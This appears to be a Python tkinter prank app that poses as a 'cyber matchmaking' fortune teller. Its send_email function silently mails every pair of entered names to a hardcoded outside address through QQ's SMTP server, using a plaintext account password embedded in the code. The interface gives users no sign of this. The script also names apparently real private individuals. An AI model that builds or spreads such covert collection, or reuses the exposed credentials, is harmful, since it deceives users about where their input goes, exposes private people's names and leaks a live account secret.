import tkinter as tk
from tkinter import messagebox
import time
import smtplib
from email.mime.text import MIMEText
from email.header import Header
from email.utils import formataddr

def send_email(name, city):
    print("准备发送邮件")
    sender_email = "1172887591@qq.com"
    sender_password = "fytdreycyrcihdac"
    receiver_email = "17683743414@163.com"

    subject = "劲爆八卦"
    body = f"男生名字：{name}\n女生名字：{city}"

    # 正确格式的 From 和 To
    message = MIMEText(body, "plain", "utf-8")
    message["From"] = formataddr(("姻缘测算系统", sender_email))
    message["To"] = formataddr(("自己", receiver_email))
    message["Subject"] = Header(subject, "utf-8")

    try:
        server = smtplib.SMTP_SSL("smtp.qq.com", 465)
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, [receiver_email], message.as_string())
        server.quit()
        print("邮件发送成功！")
    except Exception as e:
        print("邮件发送失败：", e)


def submit():
    name = entry_name.get()
    city = entry_city.get()

    send_email(name,city)

    if name == "杨应震" and city == "黄文思":
        loading()
        retry = messagebox.showinfo("结果", "天作之合")
        if not retry:
            window.destroy()
    elif name != "杨应震" and city == "李秋仪":
        loading()
        retry = messagebox.showinfo("结果", "还没轮到你")
        if not retry:
            window.destroy()
    elif name == "杨应震" and city == "李秋仪":
        loading()
        retry = messagebox.showinfo("结果", "你想干什么")
        window.destroy()
    else:
        retry = messagebox.askretrycancel("错误", "输入无效，是否重试？")
        if not retry:
            window.destroy()

def loading():
    load_win = tk.Toplevel(window)
    load_win.title("加载中...")
    load_win.geometry("200x100")
    tk.Label(load_win, text="正在测算，请稍等...").pack(pady=20)
    load_win.update()
    time.sleep(1.5)
    load_win.destroy()

# 创建主窗口
window = tk.Tk()
window.title("赛博算姻缘")
window.geometry("300x150")

# 标签和输入框
tk.Label(window, text="男生名字：").grid(row=0, column=0, padx=10, pady=10, sticky="e")
entry_name = tk.Entry(window)
entry_name.grid(row=0, column=1)

tk.Label(window, text="女生名字：").grid(row=1, column=0, padx=10, pady=10, sticky="e")
entry_city = tk.Entry(window)
entry_city.grid(row=1, column=1)

# 提交按钮
submit_button = tk.Button(window, text="提交", command=submit)
submit_button.grid(row=2, column=0, columnspan=2, pady=10)

# 启动窗口
window.mainloop()